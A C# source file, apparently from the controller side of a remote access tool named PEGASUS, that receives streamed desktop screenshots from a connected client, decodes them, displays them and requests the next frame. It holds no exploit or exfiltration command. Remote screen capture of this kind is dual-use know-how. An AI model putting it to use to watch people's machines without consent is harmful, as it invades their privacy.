using System.IO;
using PEGASUS.Tools.Networking;
using PEGASUS.Tools.Packets.ClientPackets;
using PEGASUS.Tools.Packets.ServerPackets;
using PEGASUS.Utilities;

namespace PEGASUS.Tools.Packets
{ 

public static class PacketHandler
{
	public static void HandlePacket(Client client, IPacket _packet)
	{
		if (client == null || client.Value == null)
		{
			return;
		}
		GetDesktopResponse getDesktopResponse = (GetDesktopResponse)_packet;
		if (!(getDesktopResponse.GetType() == typeof(GetDesktopResponse)) || client.Value == null || client.Value.FrmRdp == null || client.Value.FrmRdp.IsDisposed || client.Value.FrmRdp.Disposing || getDesktopResponse.Image == null)
		{
			return;
		}
		if (client.Value.StreamCodec == null)
		{
			client.Value.StreamCodec = new UnsafeStreamCodec(getDesktopResponse.Quality, getDesktopResponse.Monitor, getDesktopResponse.Resolution);
		}
		if (client.Value.StreamCodec.ImageQuality != getDesktopResponse.Quality || client.Value.StreamCodec.Monitor != getDesktopResponse.Monitor || client.Value.StreamCodec.Resolution != getDesktopResponse.Resolution)
		{
			if (client.Value.StreamCodec != null)
			{
				client.Value.StreamCodec.Dispose();
			}
			client.Value.StreamCodec = new UnsafeStreamCodec(getDesktopResponse.Quality, getDesktopResponse.Monitor, getDesktopResponse.Resolution);
		}
		using (MemoryStream inStream = new MemoryStream(getDesktopResponse.Image))
		{
			client.Value.FrmRdp.picDesktop.UpdateImage(client.Value.StreamCodec.DecodeData(inStream), cloneBitmap: true);
		}
		getDesktopResponse.Image = null;
		if (client.Value != null && client.Value.FrmRdp != null)
		{
			new GetDesktop(getDesktopResponse.Quality, getDesktopResponse.Monitor).Execute(client);
		}
	}
}
}